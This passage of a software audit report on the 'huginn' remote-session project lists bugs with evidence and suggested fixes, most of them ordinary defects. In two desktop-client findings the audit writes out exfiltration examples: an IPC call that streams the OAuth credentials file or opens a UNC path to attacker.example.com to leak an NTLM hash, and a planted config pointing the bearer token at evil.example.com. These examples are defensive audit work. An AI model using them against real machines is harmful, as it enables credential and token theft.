**What goes wrong:** Owner attaches a photo in a session; Claude Code writes the image-caption user record -> the conversation view shows a bubble where the owner apparently recited 'Image: original 1530x2048, displayed at 1494x2000. Multiply coordinates...' at their own phone — the verbatim regression the code claims fixed.

<details><summary>Evidence</summary>

```
Lines 115-118 suppress both (`if (/^\s*\[Image: original \d+x\d+/.test(s)) return null;` / `if (/^\s*\[Your previous response/.test(s)) return null;`) but humanRemainder (134-151) strips only tagged elements and the SYSTEM NOTIFICATION preamble, then case 'user' does `const rest = humanRemainder(t); if (rest) out.events.push({ ..., kind: 'user', text: rest })`. Ran it: a user record containing the caption renders as `[{"kind":"user","text":"[Image: original 1530x2048, displayed at 1494x2000. Multiply coordinates by 1.02..."}]`, the nudge record likewise; control `<system-reminder>` record correctly renders []. Real data: 18 `[Image: original` records and `[Your previous response had no\nvisible output...]` present in transcripts on this box. The module's own comment (lines 69-75) describes exactly this wrong rendering as the bug the list was added to fix.
```

</details>

**Suggested fix:** In case 'user', skip humanRemainder when machineText matched one of the bracket-only patterns (or add the same two openings to humanRemainder's strip list, mirroring how the SYSTEM NOTIFICATION preamble is stripped). Add readTranscript-level tests for both patterns — current tests only exercise machineText/describeMachineText in isolation.

### `server/bin/huginn-claude-title:97`

State files are removed only by the SessionEnd hook, so killing a tmux session orphans /run/huginn-claude-state/<name>; readSessionState applies no freshness guard, so recreating a session with the same name serves the DEAD session's transcript path and state to the clients.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C9 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner runs `huginn kill seerr` from the phone, then later `huginn seerr` to start fresh. Between session creation and the first hook firing, appd lists `seerr` with the orphaned file's `transcript` pointing at the previous conversation's .jsonl and `state: idle`, so the phone renders the OLD conversation as the new session's content. If the recreated session never runs claude (the repo `cc`, unlike the deployed one, does not autostart it), the stale mapping is served indefinitely.

<details><summary>Evidence</summary>

```
huginn-claude-title:78-97 — the only `rm -f "$STATE_DIR/$sess"` is in the `else` branch reached when `$icon` is empty, i.e. `SessionEnd) icon="" ;;` only.
/opt/huginn-appd/huginn-appd.js:241-259 readSessionState: reads the file by tmux session NAME, returns `{state, sessionId, transcript, cwd, stateSince}` with no check that the sessionId is still alive and no mtime cutoff (mtime is only used as a stateSince fallback).
startStateWatch (huginn-appd.js:1972-1977) only mkdirs STATE_DIR; nothing ever prunes orphans.
RAN (repro): drove huginn-claude-title inside a scratch tmux session `audit_title` -> /run/huginn-claude-state/audit_title = {"state":"idle","sessionId":"SID-123","transcript":"/tmp/t.jsonl",...}. Then `tmux kill-session -t '=audit_title'` (exactly what `huginn kill <name>` does, client/huginn.sh:212) -> the session is gone from `tmux ls` but BOTH audit_title and audit_title.tmp were still present in /run/huginn-claude-state (I removed them manually as cleanup).
```

</details>

**Suggested fix:** Have appd ignore a state file whose recorded sessionId has no live process / whose mtime predates the tmux session's creation time, and/or prune STATE_DIR entries with no corresponding tmux session on each alertTick.

### `server/setup.sh:46`

setup.sh unconditionally overwrites the target user's ~/.tmux.conf with no backup, destroying any local tmux customisation on every run.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Operator has customised ~/.tmux.conf (e.g. uncommented `set -g mouse on` for touch scrolling, per the commented hint in server/tmux.conf itself, or added their own keybindings). They run `sudo bash huginn/server/setup.sh` to pick up a new cc — and their tmux config is gone with no backup, mouse mode off, custom binds lost.

<details><summary>Evidence</summary>

```
setup.sh:45-46:
  TARGET_HOME="${HUGINN_HOME:-/root}"
  cp "$HERE/tmux.conf" "$TARGET_HOME/.tmux.conf"
No `-b`, no `-n`, no existence test, and unlike the ~/.claude/settings.json hook merge immediately below (which I verified IS idempotent and preserving over 3 runs) there is no merge logic at all.
RAN (repro) in a scratch HOME containing a user config (`# MY CUSTOM TMUX CONFIG` / `set -g mouse on`): after the exact `cp` line, the file is huginn's tmux.conf and `ls -la` shows only `.tmux.conf` — no `.tmux.conf.bak`, no recovery path.
```

</details>

**Suggested fix:** `cp -n` with a notice, or `install -b -m 0644` so the previous file lands at .tmux.conf~, and print which file was replaced.

---

# LOW

### `/etc/systemd/system/huginn-appd.service:6`

The unit carries no sandboxing whatsoever (systemd-analyze scores it 9.6 UNSAFE) and I measured which directives are actually compatible with its job: UMask, ProtectSystem=full and NoNewPrivileges are; PrivateTmp and ProtectHome definitively are not.

**lane** appd secrets hygiene, credential handling, and host hardening · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Not an exploit today — the process is root by design and its bearer token is root-equivalent, so most sandboxing buys little. The concrete cost is the one directive that does pay: with no UMask=, every file the daemon creates without an explicit mode is world-readable, which is what makes the chat-transcript finding above a live-fire risk on any rebuild. The secondary cost is the ignored StartLimitIntervalSec: the comment says 'tailscale IP may not be assignable yet right after boot — keep retrying', but because the key is in the wrong section systemd applies the default start-rate limit, so a boot where tailscaled is slow can exhaust the burst and leave the daemon dead with the phone and desktop clients simply unable to reach the host.

<details><summary>Evidence</summary>

```
`systemctl cat huginn-appd` shows a [Service] block with only Type/ExecStart/Restart/RestartSec/StartLimitIntervalSec/WorkingDirectory/Environment — no NoNewPrivileges, ProtectSystem, ProtectHome, PrivateTmp, RestrictAddressFamilies, CapabilityBoundingSet or UMask — plus a drop-in adding `Environment=HUGINN_APPD_BIND=0.0.0.0`. `systemd-analyze security huginn-appd` -> `→ Overall exposure level for huginn-appd.service: 9.6 UNSAFE 😨`, explicitly flagging `✗ UMask= Files created by service are world-readable by default`. RAN, five transient systemd-run probes: `PrivateTmp=yes -> SOCKET-GONE` (baseline `SOCKET-VISIBLE` for /tmp/tmux-0/default; `tmux list-sessions` under PrivateTmp fails with `error connecting to /tmp/tmux-0/default (No such file or directory)`); `ProtectHome=yes -> CREDS-BLOCKED` for /root/.claude/.credentials.json; `ProtectHome=read-only -> WRITE-BLOCKED` (`Read-only file system`); `ProtectSystem=full -> TOKEN-READABLE` (/etc/huginn-appd/token) + `VARLIB-WRITABLE` + `HOME-WRITABLE`; `UMask=0077 -> drwx------ / -rw-------`; `NoNewPrivileges=yes -> tmux 3.6b` and `v22.23.1` both fine. Also noted: the unit logs `Unknown key name 'StartLimitIntervalSec' in section 'Service', ignoring.` at every load — that key belongs in [Unit], so the intended 'keep retrying forever after boot' behaviour is not in effect.
```

</details>

**Suggested fix:** Add to the [Service] block, all four measured compatible: `UMask=0077` (the one that matters — closes the world-readable default), `NoNewPrivileges=yes` (note it is inherited by act-mode chats, which run arbitrary root commands, so drop it if a setuid helper is ever needed there), `ProtectSystem=full` (only caveat: /usr goes read-only, and `claude` lives at /usr/lib/node_modules/@anthropic-ai/claude-code — an auto-update attempted by an appd-spawned `claude -p` would fail, so weigh that), and `ProtectControlGroups=yes`/`ProtectKernelTunables=yes` which nothing here touches. Do NOT add PrivateTmp (kills the tmux socket, hence every session route) or ProtectHome in any mode (blocks ~/.claude, hence account switching and every chat spawn). Separately, move `StartLimitIntervalSec=0` from [Service] to [Unit] so the comment above it becomes true.

### `CONTRIBUTING.md:7`

CONTRIBUTING.md's two hardest ground rules are both now false of the repo: "No frameworks, no daemons, no build step" describes a repo that contains a Node daemon, a Gradle/KMP build and an Electron app, and "No real IPs, hostnames" is violated by a real Tailscale address in ~14 tracked files including the security-critical update-feed pin.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A contributor obeying CONTRIBUTING.md replaces the literal in UpdateFeed.kt:34 with a `<host>` placeholder or a settings-derived value to satisfy the no-real-IPs rule, and in doing so destroys the update-feed pin — the exact HIGH that was fixed in Electron 0.2.0, where whoever controls the feed controls what executable runs on the owner's machine (builds are unsigned). The "no daemons, no build step" rule meanwhile tells them not to touch the two largest components in the repo.

<details><summary>Evidence</summary>

```
CONTRIBUTING.md:7 "- **Stay tiny.** No frameworks, no daemons, no build step. Plain `bash`, `tmux`, and PowerShell." and :9 "- **No secrets, ever.** No real IPs, hostnames, keys, or tokens in the repo. Use placeholders (`<host>`, `<VMID>`)."
Against the tree: server/appd/ is a 148 KB Node daemon plus 19 lib modules; mobile/ is a four-module Gradle KMP build; desktop/ is Electron. And grep for the host's tailnet address:
```
server/appd/deploy.sh:16, desktop/scripts/release.sh:15, mobile/scripts/{ship,release-desktop}.sh,
mobile/core/.../AppdRoutes.kt:17, HuginnSettings.kt:107 (DEFAULT_BASE_URL),
mobile/app-desktop/.../DesktopSettings.kt:463, update/UpdateFeed.kt:34 ("huginn, tailnet"),
plus 6 test files
```
UpdateFeed.kt:34 is the pinned update feed required by contract C4 — it MUST be a real literal address, so the rule as written cannot be followed.
```

</details>

**Suggested fix:** Rewrite CONTRIBUTING.md's ground rules for the repo as it exists: state that server/appd (Node, zero-dependency) and mobile (Gradle KMP) are in scope with their own conventions, keep "stay tiny" scoped to client/ and server/bin, and narrow the secrets rule to keys/tokens plus an explicit carve-out for the pinned host address (which is a security control, not a leak).

### `client/termux-detach-button.sh:8`

The script overwrites its own backup on every run, so a second invocation replaces the pristine termux.properties backup with the already-modified file, making the user's original extra-keys unrecoverable.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** User runs `bash client/termux-detach-button.sh`, decides they preferred their old key row, re-runs it (or runs it again after a Termux reinstall). The .bak-huginn file now holds huginn's own key row, and their original custom extra-keys configuration is gone with the backup the script promised.

<details><summary>Evidence</summary>

```
termux-detach-button.sh:8 `cp "$F" "$F.bak-huginn" 2>/dev/null` — unconditional, no `-n`, no timestamp; line 18 then advertises "(previous termux.properties backed up to $F.bak-huginn)".
RAN (repro): seeded termux.properties with `extra-keys = [["MY","ORIGINAL","KEYS"]]` + `bell-character=ignore`, ran the script's exact cp/grep/echo sequence twice. After run 2 the backup contains:
  bell-character=ignore
  extra-keys = [["ESC","TAB"]]
The user's original extra-keys line is present in neither the live file nor the backup.
(Also line 10: `grep -v ... > "$F.tmp" && mv "$F.tmp" "$F"` — on a file with no extra-keys line grep exits 1, mv is skipped, and $F.tmp is left behind; harmless but stray.)
```

</details>

**Suggested fix:** `[ -f "$F.bak-huginn" ] || cp "$F" "$F.bak-huginn"`, or back up to a timestamped filename.

### `desktop/src/main/ipc.ts:104`

The preload forwards any IPC channel unfiltered and the uploads.file handler passes the renderer's string straight to fs.statSync/fs.createReadStream, so renderer input reaches a Node filesystem API with no path constraint.

**lane** Electron desktop client (/opt/huginn/desktop) — security + data-loss only · **verdict** not separately verified

**What goes wrong:** Any renderer-side code execution (a compromised npm dependency in the React bundle, or a future XSS) turns into arbitrary local file exfiltration in one call: window.huginn.invoke('uploads.file', 'C:\\Users\\<owner>\\.claude\\.credentials.json') streams the OAuth credentials to POST /v1/uploads, where they land as a retrievable upload. The same call with a UNC path ('\\\\attacker.example.com\\share\\x') makes the main process open an outbound SMB connection and leak the machine's NTLM hash off-box.

<details><summary>Evidence</summary>

```
preload/index.ts:18-19 allowlists only the push channels, never invoke: `invoke: (channel: string, ...args: unknown[]): Promise<unknown> => ipcRenderer.invoke(channel, ...args)`. ipc.ts:104-107 then does:

  handle('uploads.file', async (_wc, filePath) => {
    const stat = fs.statSync(filePath)
    const stream = fs.createReadStream(filePath)

The intended source is webUtils.getPathForFile on a dropped File (Composer.tsx:144-146), but nothing binds the handler to that origin. Note this is defence-in-depth only: I found no reachable renderer code-execution path — CSP is default-src 'self'/script-src 'self' with no inline script, there is no innerHTML/dangerouslySetInnerHTML/eval/new Function anywhere in src/renderer, markdown hrefs are scheme-filtered (markdown.ts:135), and contextIsolation/sandbox are on.
```

</details>

**Suggested fix:** Stop accepting raw paths over IPC. Have the preload mint an opaque handle at drop/pick time (webUtils.getPathForFile result stored in a main-side map keyed by a random id) and let uploads.file take only that id, so the renderer can name a file it was actually given but cannot name one it was not.

### `desktop/src/main/settings.ts:82`

isAllowedBaseUrl is enforced only on the Settings write path; the value loaded from config.json at startup is never re-validated, so the allowlist is bypassed by anything that can write that file.

**lane** Electron desktop client (/opt/huginn/desktop) — security + data-loss only · **verdict** not separately verified

**What goes wrong:** Malware running as the owner (no elevation needed) writes {"baseUrl":"http://evil.example.com:8787"} into %APPDATA%\huginn-desktop\config.json. On the next launch every request — Authorization: Bearer <appd token>, every chat message, every pane capture — goes to evil.example.com, and the Settings screen renders that address in the Server field as a normal saved value with no warning, so the owner has no signal anything moved.

<details><summary>Evidence</summary>

```
The validator's own comment (settings.ts:34-40) calls it "NOT cosmetic validation: the Bearer token follows baseUrl on every request". It is called in exactly one place — update(), settings.ts:183. The constructor takes the file's word for it (settings.ts:81-83):

    const raw = JSON.parse(fs.readFileSync(this.file, 'utf8')) as Partial<StoredSettings>
    this.state = { ...DEFAULTS, ...raw }

and getBaseUrl() (settings.ts:140-142) returns it straight to AppdClient, which concatenates it into every request URL (client.ts:107, 196). Scope is genuinely bounded: the update feed is pinned (updater.ts:23) so no code-execution follows, and an attacker who can write config.json as the owner can also DPAPI-decrypt the token sitting in it — this is a gap in a stated defence, not a new capability.
```

</details>

**Suggested fix:** Re-run the check on load: after `this.state = { ...DEFAULTS, ...raw }`, add `if (!isAllowedBaseUrl(this.state.baseUrl)) this.state.baseUrl = DEFAULTS.baseUrl` and log the reset.

### `docs/ADDING-A-FEATURE.md:20`

The doc's C1 enforcement claim is false for :core→Compose: ':core cannot import Compose... compile-time walls' — but :core applies both Compose plugins and exposes compose.runtime + compose.ui as api dependencies, and three :core commonMain files import androidx.compose today.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A contributor (or agent) adds a @Composable card to :core — it compiles clean (compose compiler plugin is active there, compose.runtime is on the classpath), no wall fires, and :core's 'testable headless' property erodes silently. The wall genuinely exists only for android.* and for foundation/material3.

<details><summary>Evidence</summary>

```
ADDING-A-FEATURE.md:20: '`:core` cannot import Compose or Android. ... Those are compile-time walls, so drift is caught by the build.' core/build.gradle.kts: `alias(libs.plugins.compose.multiplatform)`, `alias(libs.plugins.kotlin.compose)`, and `api(compose.runtime); api(compose.ui)` with the comment 'Compose Multiplatform is here for one reason: shared code names androidx.compose.ui types'. Grep of core commonMain: TerminalGrid.kt:3 and Ansi.kt:3 import androidx.compose.ui.graphics.Color; Markdown.kt:3-9 imports androidx.compose.ui.text.*.
```

</details>

**Suggested fix:** Either amend the doc to state the real wall (':core may name compose.ui data types — Color, AnnotatedString — but no @Composable, no foundation/material3') or drop compose.runtime from :core's api and keep only compose.ui, making the doc true.

### `mobile/CHANGELOG.md:3`

The phone changelog — which ship.sh uploads to devstore as the user-facing release notes — tops out at 2.52.0 / appd 2.47.0 while the shipped app is 2.55.0 and the running daemon is 2.52.2, so three app releases and five daemon releases are undocumented.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner installs 2.55.0 from devstore, opens the release notes, and is shown 2.52.0's. Nothing tells him that appd 2.52.2 fixed questions vanishing from both conversation views — the fix that required no client update and therefore has no other announcement path — so a behaviour change that silently altered both clients has no user-visible record anywhere. Version consistency itself is fine: repo VERSION, deployed VERSION and /v1/ping all agree on 2.52.2.

<details><summary>Evidence</summary>

```
mobile/CHANGELOG.md:3 `## 2.52.0 / appd 2.47.0 — 2026-07-30` is the newest entry.
mobile/app/build.gradle.kts:40 `versionName   = "2.55.0"`; mobile/dist/latest.json (the tracked record of what shipped) `"versionName":"2.55.0"`; live `GET /v1/ping` -> `{"ok":true,"version":"2.52.2","host":"huginn"}` and huginn-appd.js:51 `const VERSION = '2.52.2';`.
mobile/dist/CHANGELOG.md is byte-identical to mobile/CHANGELOG.md (`diff -q` silent), and ship.sh:52-53 scps it to the devstore app dir, so the stale file is the one users read.
```

</details>

**Suggested fix:** Add entries for 2.53.0-2.55.0 and appd 2.48.0-2.52.2 to mobile/CHANGELOG.md, and consider having build.sh refuse when the top changelog heading does not name the versionName it is about to build.

### `mobile/README.md:145`

Two broken references in mobile/README's opening and Server sections: the deploy command names a path that does not exist, and the devstore link points outside the repo.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Following the README's Server block verbatim, `server/deploy.sh` returns "No such file or directory", so a first-time deploy of the daemon fails at its first documented step with no hint that the path gained a directory. The devstore link 404s in any renderer.

<details><summary>Evidence</summary>

```
mobile/README.md:144-146:
```
scp/rsync this repo to huginn, then:
server/deploy.sh          # installs /opt/huginn-appd, mints the token, starts the unit
```
The script is at `server/appd/deploy.sh` (verified: `ls server/` -> `appd/ bin/ claude-hooks.json setup.sh tmux.conf`; there is no `server/deploy.sh`).
mobile/README.md:4: "published to the self-hosted [devstore](../dev-ledger/devstore)" — `/opt/huginn/dev-ledger` and `/opt/dev-ledger` both do not exist (leftover from before the mobile app moved out of the netplan tree on 2026-07-28).
```

</details>

**Suggested fix:** Change :145 to `server/appd/deploy.sh` and either point :4 at the devstore's real location or drop the link and name it in prose.

### `mobile/app-desktop/build.gradle.kts:205`

The Compose .deb ships with an invalid Maintainer field — the email is the literal string "Unknown" — because nativeDistributions has no `linux { debMaintainer = ... }` block.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Debian policy 5.6.2 requires Maintainer to be an RFC822 address. `lintian` rejects it, and any attempt to put this .deb in an apt repository (reprepro, aptly, a Cloudsmith/Gemfury mirror) fails validation on the malformed address — so the moment the Linux client is distributed by anything other than a hand-copied file, packaging has to be changed first. `apt show huginn-desktop-kt` also displays a maintainer nobody can contact.

<details><summary>Evidence</summary>

```
RAN `dpkg-deb -I .../huginn-desktop-kt_0.3.2-1_amd64.deb`:
```
 Package: huginn-desktop-kt
 Version: 0.3.2-1
 Maintainer: silencelen <Unknown>
```
build.gradle.kts:205-224 declares packageName/packageVersion/description/vendor/modules and `targetFormats(TargetFormat.Deb)` but no `linux { }` block at all, so Compose falls back to `<vendor> <Unknown>`. (The rest of the deb is fine: postinst does `xdg-desktop-menu install /opt/huginn-desktop-kt/lib/huginn-desktop-kt-huginn-desktop-kt.desktop`, xdg-utils is in Depends, and the install path /opt/huginn-desktop-kt does not collide with the Electron deb's package name `huginn-desktop` or its /opt/Huginn path.)
```

</details>

**Suggested fix:** Add to nativeDistributions:
```
linux {
    debMaintainer = "jacob@monahanhosting.com"   // same address as desktop/package.json author
    menuGroup = "Utility"
    appCategory = "Utility"
}
```

### `mobile/app-desktop/packaging/huginn-desktop-kt.nsi:92`

Every nsExec::ExecToStack call pops only the return value and leaves the captured output string on the NSIS stack, so each installer run leaks 1-3 (unbounded in the retry loop) stale entries.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Today the consequence is bounded — nothing later in either Section pops without a matching push (`${GetSize}` and the MUI macros are balanced), so the leaked strings are inert garbage. It becomes a real bug the first time anyone adds an Exch/Pop-based macro or a plugin call after `Call EnsureNotRunning` that assumes a clean stack: it would silently read a tasklist output line instead of its own value, in an installer that has no way to report it. A user who clicks Retry ten times leaks ten entries in one run.

<details><summary>Evidence</summary>

```
nsExec::ExecToStack pushes the command OUTPUT and then the RETURN VALUE on top; a caller must Pop twice. All four call sites pop once:
```
  retry:
    nsExec::ExecToStack 'cmd /c tasklist /FI "IMAGENAME eq ${APP_EXE}" /NH | find /I "${APP_EXE}"'
    Pop $0
    ${If} $0 != 0
      Return
```
(same at lines 109, 121, and inside the un. copy generated by `!insertmacro EnsureNotRunning "un."`). `nsExec::ExecToLog` at lines 106/114 pushes only the return value, so those two are correct — which is what makes the ExecToStack sites look deliberate rather than uniform.
RAN `makensis -V4` on the real script with a synthetic SRC_DIR: compiles clean, exit 0, produces a valid `Nullsoft Installer self-extracting archive`, and the verbose log shows all four `Plugin command: ExecToStack ...` sites. The `retry:` label is reachable in a loop (MB_YESNOCANCEL -> IDNO -> retry, and MB_RETRYCANCEL -> IDRETRY -> retry), so the leak is unbounded in the user-retry path.
```

</details>

**Suggested fix:** Add the missing pop at all four ExecToStack sites: `Pop $0` (return value) followed by `Pop $1` (output), or switch them to `nsExec::ExecToLog`, which pushes only the return value and is already used two lines away for the taskkill calls.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ChatController.kt:197`

New drift beyond task #20: the C5 SEED-XOR-REPLAY reattach decision is implemented twice at shell level — phone reattachPlan() and desktop reattachFlow() — instead of once in :core; the two are consistent today but nothing keeps them so.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** not separately verified

**What goes wrong:** The next tweak to the seed rule (e.g. handling a daemon that sends partialText without seq differently) lands in one shell only; that client double-renders or truncates a live answer on reconnect while the other is correct — the exact bug class C5 exists to prevent, differing per platform.

<details><summary>Evidence</summary>

```
Phone HuginnViewModel.kt:72 `internal fun reattachPlan(meta: ChatDetail?): Reattach?` — pure function: seq!=null → Reattach(seed=partialText?:"", since=seq); seq==null → Reattach(seed="", since=0). Desktop ChatController.kt:197 reattachFlow(): same branch structure (`if (seq != null) { _partial.value = d.partialText ?: ""; client.streamChat(chatId, since = seq) } else { _partial.value = ""; client.streamChat(chatId, since = 0) }`), with its own comment admitting 'It was written twice first, and the second copy is exactly where a double-rendered answer would come from.'
```

</details>

**Suggested fix:** Phone's reattachPlan is already pure and :core-shaped — move it to :core (e.g. next to Models.kt's ChatDetail) and have desktop's reattachFlow consume it.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/notify/Notifiers.kt:16`

FallbackNotifier does not override `healthy`, so Settings' "Send test notification" reports success on the very press that proved the primary backend is dead — the green light the seam was built to avoid.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified

**What goes wrong:** Owner suspects notifications are broken and presses "Send test notification" in Settings. The toast notifier is asked, PowerShell exits non-zero (blocked by execution policy, or WinRT unavailable), `failed` is set — and the UI prints "test notification sent" while nothing appeared. He concludes the notification path is fine and the problem is elsewhere. Pressing it a second time would work (active() is now the AWT balloon), but he has no reason to.

<details><summary>Evidence</summary>

```
Main.kt:106-118 wires the test button to the real path and uses the notifier's own health as the verdict:

  NotifierSeam.sendTest = {
      notifier.post( NotifyRequest(key = "diag-test", ...) )
      notifier.healthy            // <- 117
  }

On Windows `notifier` is a FallbackNotifier (Notifiers.kt:67-69 `return if (awt != null) FallbackNotifier(toast, awt) else toast`). FallbackNotifier (Notifiers.kt:16-43) overrides name, supportsActions, supportsWithdraw, post, withdraw and close — but NOT `healthy`, so it takes the interface default, Notifier.kt:62 `val healthy: Boolean get() = true`. Meanwhile post() went to `active()` = the toast notifier, which set its own `failed = true` (WindowsToastNotifier.kt:88).

SettingsView.kt:515-519 renders that verdict verbatim:

  note = when (NotifierSeam.fire()) {
      true -> "test notification sent"
      false -> "the desktop notifier refused — no notification daemon?"

The whole point of NotifierSeam (NotifierSeam.kt:5-9) is "a test button that does not exercise the real delivery path is worse than no button — it is a green light wired to nothing"; this is the same green light one layer up.
```

</details>

**Suggested fix:** Add `override val healthy: Boolean get() = primary.healthy || fallback.healthy` to FallbackNotifier — or better, have it report the health of whichever backend actually took the post. Then make sendTest return that after the post, so the first press either delivers or says it did not.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Lists.kt:152`

Both list rows freeze their "now" against the row's data object, so an idle chat or session shows an age that never advances — it stays at whatever it was when the row was first drawn.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **verdict** not separately verified

**What goes wrong:** Owner opens the Chats list at 09:00. A chat last touched at 08:55 renders "5m". He leaves the window open on his second monitor all morning. At 12:00 that row still reads "5m" and its hover tip still says the activity was five minutes ago, because nothing about that chat changed and `remember(chat)` never re-ran — so the one column that answers "what have I not looked at in a while" is wrong by three hours, and wrong in the reassuring direction.

<details><summary>Evidence</summary>

```
Lists.kt:152 (ChatRow) and Lists.kt:243 (SessionRow) are identical:

  val now = remember(chat) { System.currentTimeMillis() / 1000 }
  ...
  Tip(timeTip("Last activity", chat.updatedAt, now)) {
      Muted(relTime(chat.updatedAt), Modifier.padding(start = Space.unit))
  }

`remember(key)` only recomputes when the key is unequal. `Chat` (core/.../Models.kt:253-267) and `Session` (Models.kt:36-58) are @Serializable data classes whose fields are all facts about the row — id/title/mode/model/effort/createdAt/updatedAt/lastSnippet/turns/running/pending, and name/activityAt/state/stateSince/preview/... — none of which carries a server clock. So for a row that is not changing, the 5-second poll (AppStore.POLL_MS) hands back an EQUAL object every time and `now` is never recomputed. `relTime` and `timeTip` are then both computed against a stale reference point.
```

</details>

**Suggested fix:** Hoist the clock out of the row and tick it: keep a single `var nowSec by remember { mutableStateOf(...) }` in ChatsList/SessionsList with a `LaunchedEffect(Unit) { while (true) { delay(30_000); nowSec = System.currentTimeMillis() / 1000 } }`, and pass it down to both rows. One ticker per list, and every row's age advances.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Lists.kt:443`

New drift beyond task #20: relTime() is duplicated verbatim in both shells (device-clock relative time for list rows), a third sibling of :core WorkSummary.sinceShort.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** not separately verified

**What goes wrong:** A change to the bucket wording or a decision to switch list rows to server time gets made in one shell only; phone and desktop session lists then disagree about 'when' for the same daemon timestamps.

<details><summary>Evidence</summary>

```
app Common.kt:237-246 and app-desktop Lists.kt:443-451 are byte-equivalent logic: `(System.currentTimeMillis() / 1000 - epochSec).coerceAtLeast(0)` then now/m/h/d buckets. :core WorkSummary.sinceShort(atSec, nowSec) implements the same buckets against a caller-supplied (server) clock.
```

</details>

**Suggested fix:** Give WorkSummary.sinceShort (or a new :core relTime(epochSec, nowSec)) both callers and delete the two shell copies; shells pass their own now().

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SessionView.kt:479`

Desktop terminal font size is fixed: DesktopSettings persists a fontScale nothing reads, while the phone has pinch-zoom — a dead setting plus a missing control.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner wants a denser pane to see a wide log line, or larger glyphs at TV distance: the desktop Screen tab offers no zoom (no Ctrl+scroll, no Ctrl+/-, no setting), and the persisted fontScale value silently does nothing — a knob that stores but never acts.

<details><summary>Evidence</summary>

```
SessionView.kt:478-479 `val monoPx = with(density) { LocalMonoStyle.current.fontSize.toPx() }; val painter = remember(monoPx) { SkiaCellPainter(monoPx) }` — fontScale never consulted. DesktopSettings.kt:123/151/187-190 implement _fontScale/setFontScale; grep for fontScale in app-desktop outside DesktopSettings.kt returns nothing. Phone TerminalScreen.kt:128-131 pinch `detectTransformGestures` -> onFontScale, coerced 5.5-22, feeding AndroidCellPainter.
```

</details>

**Suggested fix:** Feed settings.fontScale into monoPx in ScreenTab and bind Ctrl+scroll / Ctrl+= / Ctrl+- (clamped in DesktopSettings like listWidth); or delete the dead setting if the owner declines the feature.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SettingsView.kt:124`

Desktop has no controls for host-sent Telegram alerts (enable, fallback-vs-always mode, send test), which the phone has.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner at the desktop wants Telegram alerts on 'always' while testing (or wants to send a test alert); the desktop offers nothing — he needs the phone in hand to change a host-side setting, and the desktop's notify-claim status line even references the Telegram fallback it cannot configure.

<details><summary>Evidence</summary>

```
grep -rn 'setAlerts|sendTestAlert|alertsMode' app-desktop/src/main returns nothing; core has setAlerts (HuginnClient.kt:250) and alerts() (:248). Phone SettingsScreen.kt:208-262 renders the full 'Alerts from huginn' section with enable switch, fallback/always switch and 'Send a test'.
```

</details>

**Suggested fix:** Add an 'Alerts from huginn' block to SettingsView's Notifications section calling client.alerts()/setAlerts()/sendTestAlert-equivalent — all host-side state, ~30 LOC of shell UI.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SettingsView.kt:169`

Desktop has no host-wide sign-out, though :core has logout() and the phone offers it with a blast-radius confirmation.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner needs to sign the compromised/expiring account out of the host from the desktop (e.g. phone dead); the accounts section can add/switch/forget but not log out — the one credential-hygiene verb is missing on the least-constrained client.

<details><summary>Evidence</summary>

```
grep -rn 'logout|signOut' app-desktop/src/main returns nothing; core HuginnClient.kt:419 `suspend fun logout(): Account`. Phone SettingsScreen.kt:392 'Sign out' button + 613-629 confirm dialog spelling out that scheduled jobs stop.
```

</details>

**Suggested fix:** Add 'Sign out' with the phone's exact warning text to AccountsSection, calling client.logout() then reload().

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/SettingsView.kt:188`

Desktop displays autoswitch state but cannot toggle it, though :core already has setAutoswitch and the phone exposes the switch.

**lane** feature parity, phone vs desktop · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** An unwanted mid-week account rotation fires while the owner is at the desktop; the line reads 'autoswitch on · 3 accounts' but turning it off requires the phone.

<details><summary>Evidence</summary>

```
SettingsView.kt:188 `runCatching { store.client.autoswitch() }` is read-only and autoswitchLine() renders text only; grep shows no app-desktop caller of setAutoswitch (core HuginnClient.kt:311-314). Phone SettingsScreen.kt:340-358 has the Switch bound to onAutoswitch.
```

</details>

**Suggested fix:** Replace the muted line with the same Switch the phone has, wired to client.setAutoswitch(enabled) + reload().

